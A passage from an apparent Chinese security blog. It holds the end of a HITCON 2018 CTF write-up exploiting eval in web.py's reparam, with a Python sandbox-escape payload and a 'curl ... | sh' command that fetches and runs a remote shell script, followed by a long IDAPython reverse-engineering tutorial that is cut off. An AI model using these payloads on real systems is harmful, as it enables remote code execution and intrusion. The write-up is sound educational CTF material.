<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> live, chunk <span class="keyword">in</span> _interpolate(string_):</span><br><span class="line">    <span class="keyword">if</span> live:</span><br><span class="line">        v = eval(chunk, dictionary) <span class="comment"># dictionary = &#123;"s":"test"&#125;</span></span><br><span class="line">        result.append(sqlquote(v))</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        result.append(chunk)</span><br></pre></td></tr></table></figure>

<p>只看上面的代码，任意代码执行，非常简单了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">16</span>]: eval(<span class="string">"__import__('os').getcwd()"</span>,&#123;<span class="string">'s'</span>:<span class="string">"test"</span>&#125;)</span><br><span class="line">Out[<span class="number">16</span>]: <span class="string">'/Volumes/data/ctf/2018hitcon/oh_my_raddit'</span></span><br></pre></td></tr></table></figure>

<p>但是上面有一个操作：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">disable</span> builtins <span class="keyword">to</span> avoid risk <span class="keyword">for</span> remote code exection.</span><br><span class="line"> <span class="keyword">dictionary</span>[<span class="string">'__builtins__'</span>] = <span class="keyword">object</span>()</span><br></pre></td></tr></table></figure>

<p>把dictionary命名空间中的内建模块给替换掉了，所以导致<code>__import__</code>找不到了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">28</span>]: a[<span class="string">"__builtins__"</span>] = object()</span><br><span class="line"></span><br><span class="line">In [<span class="number">29</span>]: eval(<span class="string">"__import__('os').getcwd()"</span>,a)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">NameError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="number">-29</span><span class="number">-47</span>f22339b750&gt; <span class="keyword">in</span> &lt;module&gt;()</span><br><span class="line">----&gt; 1 eval("__import__('os').getcwd()",a)</span><br><span class="line"></span><br><span class="line">&lt;string&gt; <span class="keyword">in</span> &lt;module&gt;()</span><br><span class="line"></span><br><span class="line">NameError: name <span class="string">'__import__'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>

<p>但是这个很显然可以通过绕过没有内建模块的python沙箱的方法绕过这个限制:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eval(<span class="string">"[item for item in [].__class__.__bases__[0].__subclasses__() if item.__name__=='catch_warnings' ][0]()._module.__builtins__['__import__']('os').system('pwd')"</span>,a)</span><br></pre></td></tr></table></figure>

<p>payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(reparam(<span class="string">"a=$&#123;[item for item in [].__class__.__bases__[0].__subclasses__() if item.__name__=='catch_warnings' ][0]()._module.__builtins__['__import__']('os').system('pwd')&#125;"</span>,dict(s=<span class="string">'test'</span>)))</span><br></pre></td></tr></table></figure>

<p>看一下app.py的代码<code>method=&quot;p&quot;</code>的时候：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elif</span> method == <span class="string">'p'</span>:</span><br><span class="line">    limit = s.get(<span class="string">'l'</span>)</span><br><span class="line">    <span class="keyword">return</span> web.template.frender(<span class="string">'templates/index.html'</span>)(get_posts(limit), get_urls())</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_posts</span><span class="params">(limit=None)</span>:</span></span><br><span class="line">    records = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> db.select(<span class="string">'posts'</span>, limit=limit, order=<span class="string">'ups desc'</span>):</span><br><span class="line">        tmp = &#123;</span><br><span class="line">            <span class="string">'m'</span>: <span class="string">'r'</span>, </span><br><span class="line">            <span class="string">'t'</span>: i.title.encode(<span class="string">'utf-8'</span>, <span class="string">'ignore'</span>), </span><br><span class="line">            <span class="string">'u'</span>: i.id, </span><br><span class="line">        &#125; </span><br><span class="line">        tmp[<span class="string">'param'</span>] = encrypt(urllib.urlencode(tmp))</span><br><span class="line">        tmp[<span class="string">'ups'</span>] = i.ups</span><br><span class="line">        <span class="keyword">if</span> i.file:</span><br><span class="line">            tmp[<span class="string">'file'</span>] = encrypt(urllib.urlencode(&#123;<span class="string">'m'</span>: <span class="string">'d'</span>, <span class="string">'f'</span>: i.file&#125;))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp[<span class="string">'file'</span>] = <span class="string">''</span></span><br><span class="line">        </span><br><span class="line">        records.append( tmp )</span><br><span class="line">    <span class="keyword">return</span> records</span><br></pre></td></tr></table></figure>

<p>看到get_posts函数执行了db.select操作，把用户的limit参数带入了<code>reparam</code>函数，造成任意代码执行。</p>
<p>所以构造数据,就可以任意代码执行了,反弹shell，拿到flag:</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">"m=p&amp;l=$&#123;[<span class="string">item for item in [</span>].<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>() if item.<span class="strong">__name__</span>=='catch<span class="emphasis">_warnings' ][0]()._</span>module.<span class="strong">__builtins__</span>[<span class="string">'__import__'</span>](<span class="link">'os'</span>).system('curl http://wonderkun.cc:3000/wonderkun.cc:8888|sh')&#125;'&#125;"</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>hitcon2018</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>idapython使用笔记</title>
    <url>/2020/12/11/idapython%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="idapython的学习资料推荐"><a href="#idapython的学习资料推荐" class="headerlink" title="idapython的学习资料推荐"></a>idapython的学习资料推荐</h3><ol>
<li>《ida权威指南第二版》</li>
<li>[<a href="https://wooyun.js.org/drops/IDAPython%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%94%9F%E6%B4%BB%E6%9B%B4%E6%BB%8B%E6%B6%A6%20part1%20and%20part2.html]" target="_blank" rel="noopener">https://wooyun.js.org/drops/IDAPython%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%94%9F%E6%B4%BB%E6%9B%B4%E6%BB%8B%E6%B6%A6%20part1%20and%20part2.html]</a>(<a href="https://wooyun.js.org/drops/IDAPython" target="_blank" rel="noopener">https://wooyun.js.org/drops/IDAPython</a> 让你的生活更滋润 part1 and part2.html) </li>
<li><a href="https://cartermgj.github.io/2017/10/10/ida-python/" target="_blank" rel="noopener">https://cartermgj.github.io/2017/10/10/ida-python/</a> </li>
</ol>
<a id="more"></a>

<ol start="4">
<li><a href="https://www.hex-rays.com/products/ida/support/idapython_docs/" target="_blank" rel="noopener">https://www.hex-rays.com/products/ida/support/idapython_docs/</a> </li>
<li>《idapython book》有中文版本的翻译</li>
<li><a href="https://bbs.pediy.com/thread-225091.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225091.htm</a>  python模拟执行x86，基于idapython</li>
<li>《The Beginner’s Guide to IDAPython version 6.0》</li>
</ol>
<h3 id="ida-python2-and-python3-switch"><a href="#ida-python2-and-python3-switch" class="headerlink" title="ida python2 and python3 switch"></a>ida python2 and python3 switch</h3><p>You have chosen to enable IDAPython 2.  The IDAPython 3 plugins have been renamed to idapython.3.disabled and idapython64.3.disabled in the plugins subdirectory.  If you want to switch to IDAPython 3, proceed as follows:</p>
<ol>
<li>Rename idapython[64].dll to idapython[64].2.disabled.</li>
<li>Rename idapython[64].3.disabled to idapython[64].dll.</li>
<li>Make sure a 64-bit Python 3 interpreter is installed.</li>
<li>Run the command-line tool idapyswitch to configure IDAPython 3 for your Python interpreter.</li>
</ol>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>IDAPython核心有如下3个python模块：</p>
<ol>
<li>idc模块负责提供IDC中所有的函数功能。</li>
<li>idautils提供大量的实用函数，其中许多函数可生成各种数据库相关对象(如函数或交叉引用)的python列表。</li>
<li>idaapi 允许使用者通过类的形式，访问更多底层的数据 。</li>
</ol>
<p>需要注意的是IDAPython会自动导入idc和idautils模块，idaapi模块需要自己手工导入。</p>
<p>为了使用的清晰性，建议在开头都进行手工的import这三个模块。</p>
<p><strong>注意事项</strong></p>
<p>由于idaPython的升级，导致一些函数给改没了，文档中不再对之前版本的函数进行说明，但是这些函数都用新函数进行了实现，新旧关系的对应在文件 <code>idc_bc695.py</code>，可以进行对照说明。</p>
<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>获取当前地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">idc.here()</span><br><span class="line">idc.get_screen_ea()</span><br></pre></td></tr></table></figure>

<p>获取当前地址空间的最小地址和最大地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">idc.get_inf_attr(INF_MIN_EA)</span><br><span class="line">idc.get_inf_attr(INF_MAX_EA)</span><br></pre></td></tr></table></figure>

<p>在ida的反汇编窗口中，下面的每一个信息都可以用函数获取到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00012529 mov esi, [esp+4+arg_0]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python&gt; idc.get_segm_name(here())</span><br><span class="line"><span class="string">'.text'</span></span><br><span class="line">Python&gt; idc.GetDisasm(here())</span><br><span class="line"><span class="string">'call    sub_405060'</span></span><br><span class="line"></span><br><span class="line">Python&gt;idc.print_insn_mnem(here())</span><br><span class="line"><span class="string">'call'</span></span><br><span class="line">Python&gt;idc.print_operand(here(),<span class="number">0</span>)</span><br><span class="line"><span class="string">'sub_405060'</span></span><br><span class="line">Python&gt;idc.print_operand(here(),<span class="number">1</span>)</span><br><span class="line"><span class="string">''</span></span><br></pre></td></tr></table></figure>

<h4 id="段操作"><a href="#段操作" class="headerlink" title="段操作"></a>段操作</h4><p>打印一行数据好像并没什么卵用，但是 IDAPython 的强大之处在于它能遍历所有的指<br>令，所有的交叉引用地址，还有搜索所有的代码和数据。后面两项功能稍后再做介绍。我们<br>先从遍历所有段的指令开始讲起。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> seg <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">    print(idc.get_segm_name(seg),idc.get_segm_start(seg),idc.get_segm_end(seg))</span><br></pre></td></tr></table></figure>

<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>遍历所有函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    print(func,idc.get_func_name(func))</span><br></pre></td></tr></table></figure>

<p>Functions()将返回一个保存着已知函数首地址的数组，同样此函数也可以用来查找在指定地址范围的函数列表。</p>
<p>get_func_name(ea)用来获取函数名，ea这个参数可以是处于函数中的任何地址。</p>
<p><code>idaapi.get_func_qty()</code>  获取此binary中识别的函数的个数。</p>
<p><code>idaapi.getn_func(1)</code>获取第1个函数的对象。</p>
<p>获取函数的边界信息：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python&gt;idaapi.get_func(here())</span><br><span class="line">&lt;ida_funcs.func_t; proxy of &lt;Swig Object of type <span class="string">'func_t *'</span> at <span class="number">0x000001711FC33C00</span>&gt; &gt;</span><br><span class="line">Python&gt;idaapi.get_func(here()).start_ea</span><br><span class="line"><span class="number">0x40573c</span></span><br><span class="line">Python&gt;idaapi.get_func(here()).end_ea</span><br><span class="line"><span class="number">0x405918</span></span><br></pre></td></tr></table></figure>

<p>同时也可以使用 idc.get_next_func(ea)和get_prev_func(ea)获取ea地址的后一个函数和前一个函数。ea 的值需要在被分析的函数地址之内。在枚举函数的时候，只有 IDA 将这段代码标记为函数的时候才行，不然会在枚举的过程中被跳过。没有被标记为函数的代码将在图例（ida 顶部的彩色条）中标为红色。当然我们可以手工的修复这些无法被标记为函数的代码。</p>
<p>还可以使用如下两个api来获取函数的边界地址：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python&gt;idc.get_func_attr(here(), FUNCATTR_START)</span><br><span class="line"><span class="number">0x404c90</span></span><br><span class="line">Python&gt;idc.get_func_attr(here(), FUNCATTR_END)</span><br><span class="line"><span class="number">0x405055</span></span><br></pre></td></tr></table></figure>

<p><code>get_func_attr</code>的第二个参数有如下值：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">FUNCATTR_START</span> = <span class="number">0</span> <span class="comment"># function start address</span></span><br><span class="line"><span class="attr">FUNCATTR_END</span> = <span class="number">4</span> <span class="comment"># function end address</span></span><br><span class="line"><span class="attr">FUNCATTR_FLAGS</span> = <span class="number">8</span> <span class="comment"># function flags</span></span><br><span class="line"><span class="attr">FUNCATTR_FRAME</span> = <span class="number">10</span> <span class="comment"># function frame id</span></span><br><span class="line"><span class="attr">FUNCATTR_FRSIZE</span> = <span class="number">14</span> <span class="comment"># size of local variables</span></span><br><span class="line"><span class="attr">FUNCATTR_FRREGS</span> = <span class="number">18</span> <span class="comment"># size of saved registers area</span></span><br><span class="line"><span class="attr">FUNCATTR_ARGSIZE</span> = <span class="number">20</span> <span class="comment"># number of bytes purged from the stack</span></span><br><span class="line"><span class="attr">FUNCATTR_FPD</span> = <span class="number">24</span> <span class="comment"># frame pointer delta</span></span><br><span class="line"><span class="attr">FUNCATTR_COLOR</span> = <span class="number">28</span> <span class="comment"># function color code</span></span><br><span class="line"><span class="attr">FUNCATTR_OWNER</span> = <span class="number">10</span> <span class="comment"># chunk owner (valid only for tail chunks)</span></span><br><span class="line"><span class="attr">FUNCATTR_REFQTY</span> = <span class="number">14</span> <span class="comment"># number of chunk parents (valid only for tail chunks)</span></span><br></pre></td></tr></table></figure>

<p><code>idc.get_name_ea_simple(&quot;runtime_concatstring3&quot;)</code> 利用函数名获取一个函数的地址。</p>
<p>下面遍历函数的所有指令:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start = idc.get_func_attr(here(),FUNCATTR_START)</span><br><span class="line">end = idc.get_func_attr(here(), FUNCATTR_END)</span><br><span class="line"></span><br><span class="line">curr_addr = start </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> curr_addr &lt;= end:</span><br><span class="line">    print(hex(curr_addr),idc.GetDisasm(curr_addr))</span><br><span class="line">    curr_addr = idc.next_head(curr_addr,end)</span><br></pre></td></tr></table></figure>

<p><code>idc.next_head(curr_addr,end)</code>返回处于<code>curr_addr</code>和<code>end</code>之间的下一条指令的地址，如果没有指令则返回 <code>idc.BADADDR</code>。这种方法的一个缺陷是它依赖于指令被包含在函数开始和结束的边界内。打个比方说，函数内有个 jmp 指令，它跳转到比这个函数结束地址还要高的地址中去，意思是这个函数的所有指令可能并不是线性的，它可能会通过jmp 跳出函数边界（起始地址和结束地址），但其实这段指令仍是属于这个函数的，那么我们使用上述的方法就不能够遍历到该函数要执行的所有指令。这种跳转在代码混淆中非常的常见，所以说我们最好还是使用 idautils.FuncItems(ea)来循环函数内的指令。</p>
<p><code>idc.prev_head(ea)</code>获取ea地址的上一条指令的地址。</p>
<p>关于函数的详细信息有如下几个函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFrame</span><span class="params">(ea)</span>:</span> <span class="keyword">return</span> get_func_attr(ea, FUNCATTR_FRAME)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFrameLvarSize</span><span class="params">(ea)</span>:</span> <span class="keyword">return</span> get_func_attr(ea, FUNCATTR_FRSIZE)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFrameRegsSize</span><span class="params">(ea)</span>:</span> <span class="keyword">return</span> get_func_attr(ea, FUNCATTR_FRREGS)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFrameArgsSize</span><span class="params">(ea)</span>:</span> <span class="keyword">return</span> get_func_attr(ea, FUNCATTR_ARGSIZE)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFunctionFlags</span><span class="params">(ea)</span>:</span> <span class="keyword">return</span> get_func_attr(ea, FUNCATTR_FLAGS)</span><br></pre></td></tr></table></figure>

<p>例如用如下代码获取函数的标志：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    flags = idc.get_func_attr(func, FUNCATTR_FLAGS)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_NORET:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_NORET"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_FAR:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_FAR"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_LIB:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_LIB"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_STATIC:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_STATIC"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_FRAME:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_FRAME"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_USERFAR:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_USERFAR"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_HIDDEN:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_HIDDEN"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_THUNK:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_THUNK"</span>)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_LIB:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_BOTTOMBP"</span>)</span><br></pre></td></tr></table></figure>

<p>各种标志的含义如下：</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">FUNC_NORET:</span> 这个标志表示某个函数是否有返回值，它本身的值是 <span class="number">1</span>，下面是一个没有返回值的函数，</span><br><span class="line">注意它没有函数的最后并不是 <span class="keyword">ret</span> 或者 leave 指令</span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_FAR:</span> 这个标志非常少的出现，标志程序是否使用分段内存，它的值为 <span class="number">2</span>。</span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_USERFAR:</span> 这个标志也非常少见，也很少有文档，HexRays 把它描述为“user has specified far-ness</span><br><span class="line">of the function”，它的值是 <span class="number">32.</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_LIB:</span> 这个表示用于寻找库函数的代码。识别库函数代码是非常有必要的，因为我们在分析的</span><br><span class="line">时候一般将其跳过，它的值是 <span class="number">4</span>。下面的例子展示了如何使用这个标志。</span><br><span class="line"></span><br><span class="line">for func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    flags = idc.get_func_attr(func, FUNCATTR_FLAGS)</span><br><span class="line"></span><br><span class="line">    if flags &amp; FUNC_LIB:</span><br><span class="line">        print(hex(func), <span class="string">"FUNC_LIB"</span>,get_func_name(func))</span><br><span class="line">        </span><br><span class="line"><span class="symbol">FUNC_STATIC:</span> 这个标志作用在于识别该函数在编译的是否是一个静态函数。在 c 语言中静态函数被默</span><br><span class="line">认为是全局的。如果作者把这个函数定义为静态函数，那么这个函数在只能被本文件中的函</span><br><span class="line">数访问。利用静态函数的判定我们可以更好的理解源代码的结构。</span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_FRAME:</span> 这个标志表示函数是否使用了 ebp 寄存器（帧指针），使用 ebp 寄存器的函数通常有如</span><br><span class="line">下的语法设定，目的是为了保存栈帧。</span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00404</span>C90                 <span class="keyword">push</span>    ebp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00404</span>C91                 <span class="keyword">mov</span>     ebp, esp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00404</span>C96                 <span class="keyword">sub</span>     esp, <span class="number">65</span>Ch</span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_BOTTOMBP:</span> 和 FUNC_FRAME 一样，该标志用于跟踪帧指针（ebp）。它作用是识别函数中帧指针是</span><br><span class="line">否等于堆栈指针（esp）。</span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_HIDDEN:</span> 带有 FUNC_HIDDEN 标志的函数意味着它们是隐藏的，这个函数需要展开才能查看。如</span><br><span class="line">果我们跳转到一个标记为 HIDDEN 的地址的话，它会自动的展开。</span><br><span class="line"></span><br><span class="line"><span class="symbol">FUNC_THUNK:</span> 表示这个函数是否是一个 thunk 函数，thunk 函数表示的是一个简单的跳转函数。</span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span><span class="number">1</span>A710606 Process32Next proc near</span><br><span class="line"><span class="symbol">.text:</span><span class="number">1</span>A710606 <span class="keyword">jmp</span> ds:__imp_Process32Next</span><br><span class="line"><span class="symbol">.text:</span><span class="number">1</span>A710606 Process32Next endp</span><br><span class="line"></span><br><span class="line">需要注意的是一个函数可能拥有多个标志的组合。</span><br></pre></td></tr></table></figure>

<h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><p>如果我们拥有一个函数中的指令地址，我们可以使用 idautils.FuncItems(ea)来获取该函数中所有指令地址的集合。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">items = idautils.FuncItems(here())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">    print(hex(item),idc.GetDisasm(item))</span><br></pre></td></tr></table></figure>

<p>idautils.FuncItems(ea)会获取ea这个地址所在函数的所有指令的地址，返回一个迭代器。</p>
<p>现在我们已经完全掌握了如何循环遍历程序中的段，函数和指令，那我们就开始 show 一个非常有用的例子。有时候我们会逆向一个加壳的代码，这时知道代码中哪里进行了动态调用对分析是非常有帮助的。一个动态<br>的调用可能是由 call 或者 jump 加上一个操作数来实现的，比如说 call eax，或者 jmp edi。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    flags = idc.get_func_attr(func, FUNCATTR_FLAGS)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_LIB <span class="keyword">or</span> flags &amp; FUNC_THUNK:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dism_addr = idautils.FuncItems(func)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> dism_addr:</span><br><span class="line">        m = idc.print_insn_mnem(line)</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">"call"</span> <span class="keyword">or</span> m == <span class="string">"jmp"</span>:</span><br><span class="line">            op = idc.get_operand_type(line,<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> op == o_reg:</span><br><span class="line">                print(hex(line),idc.GetDisasm(line))</span><br></pre></td></tr></table></figure>

<p><code>get_operand_type(ea,n)</code>获取操作数类型，n=0表示第一个操作数，n=1表示第二个操作数。</p>
<p>关于类型的定义请看下一节。</p>
<p>获取当前指令的下一个指令的地址和上一个指令的地址,<code>idc.next_head</code>和<code>idc.prev_head</code>，这两个函数的功能获取的是下一条指令的地址而不是下一个地址，如果要获取下一个地址或者上一个的话，我们使用的是</p>
<p><code>idc.next_addr</code>和<code>idc.prev_addr</code>。</p>
<h4 id="操作数"><a href="#操作数" class="headerlink" title="操作数"></a>操作数</h4><p>操作数在逆向分析中经常被使用，所以说了解所有的操作数类型对逆向分析是非常有帮助的。在前面文中提到我们可以使用 idc.get_operand_type(ea,n)来获取操作数类型，ea 是一个地址，n 是一个索引。操作数总共有八种不同的类型。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">o_void: 如果指令没有任何操作数，它将返回 <span class="number">0</span>。</span><br><span class="line">o_reg: 如果操作数是寄存器，则返回这种类型，它的值为 <span class="number">1</span></span><br><span class="line">o_mem: 如果操作数是直接寻址的内存，那么返回这种类型，它的值是 <span class="number">2</span>，这种类型对寻找 DATA</span><br><span class="line">的引用非常有帮助。</span><br><span class="line"></span><br><span class="line">Python&gt;print hex(ea), idc.GetDisasm(ea)</span><br><span class="line"><span class="number">0xa05d86</span> cmp ds:dword_A152B8, <span class="number">0</span></span><br><span class="line">Python&gt;print idc.GetOpType(ea,<span class="number">0</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line">o_phrase: 如果操作数是利用基址寄存器和变址寄存器的寻址操作的话，那么返回该类型，值为<span class="number">3</span></span><br><span class="line"></span><br><span class="line">Python&gt;print hex(ea), idc.GetDisasm(ea)</span><br><span class="line"><span class="number">0x1000b8c2</span> mov [edi+ecx], eax</span><br><span class="line">Python&gt;print idc.GetOpType(ea,<span class="number">0</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line">o_displ: 如果操作数是利用寄存器和位移的寻址操作的话，返回该类型，值为 <span class="number">4</span>，位移指的是像如下代码中的 <span class="number">0x18</span>，这在获取结构体中的某个数据是非常常见的。</span><br><span class="line"></span><br><span class="line">Python&gt;print hex(ea), idc.GetDisasm(ea)</span><br><span class="line"><span class="number">0xa05dc1</span> mov eax, [edi+<span class="number">18</span>h]</span><br><span class="line">Python&gt;print idc.GetOpType(ea,<span class="number">1</span>)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"></span><br><span class="line">o_imm: 如果操作数是一个确定的数值的话，那么返回类型，值为 <span class="number">5</span></span><br><span class="line">-------------------------------------------</span><br><span class="line">Python&gt;print hex(ea), idc.GetDisasm(ea)</span><br><span class="line"><span class="number">0xa05da1</span> add esp, <span class="number">0</span>Ch</span><br><span class="line">Python&gt;print idc.get_operand_type(ea,<span class="number">1</span>)</span><br><span class="line"><span class="number">5</span></span><br><span class="line">-------------------------------------------</span><br><span class="line">o_far: 这种返回类型在 x86 和 x86_64 的逆向中不常见。它用来判断直接访问远端地址的操作数，值为<span class="number">6</span></span><br><span class="line">o_near: 这种返回类型在 x86 和 x86_64 的逆向中不常见。它用来判断直接访问近端地址的操作数，值为 <span class="number">7</span></span><br></pre></td></tr></table></figure>

<h5 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h5><p>当我们在逆向一个可执行文件的时候，我们可能会注意到一些代码会不断的重复使用某<br>个偏移量。这种操作感觉上是代码在传递某个结构体给不同的函数使用。接下来的这个例子<br>的目的是创建一个 python 的字典，字典包含了可执行文件中使用的所有偏移量，让偏移量<br>作为字典的 key，而每个 key 对应的 value 存储着所有使用该偏移量的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">displace = defaultdict(list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    flags = idc.get_func_attr(func, FUNCATTR_FLAGS)</span><br><span class="line">    <span class="keyword">if</span> flags &amp; FUNC_LIB <span class="keyword">or</span> flags &amp; FUNC_THUNK:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dism_addr = idautils.FuncItems(func)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> dism_addr:</span><br><span class="line">        op = <span class="literal">None</span></span><br><span class="line">        index = <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 定义结果结构来解析当前的指令</span></span><br><span class="line">        tmp = idaapi.insn_t()</span><br><span class="line">        idaapi.decode_insn(tmp,line)</span><br><span class="line">        <span class="keyword">if</span> tmp.Op1.type == idaapi.o_displ:</span><br><span class="line">            op = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> tmp.Op2.type == idaapi.o_displ:</span><br><span class="line">            op = <span class="number">2</span> </span><br><span class="line">        <span class="keyword">if</span> op == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"bp"</span> <span class="keyword">in</span>  idc.print_operand(line,<span class="number">0</span>) <span class="keyword">or</span> <span 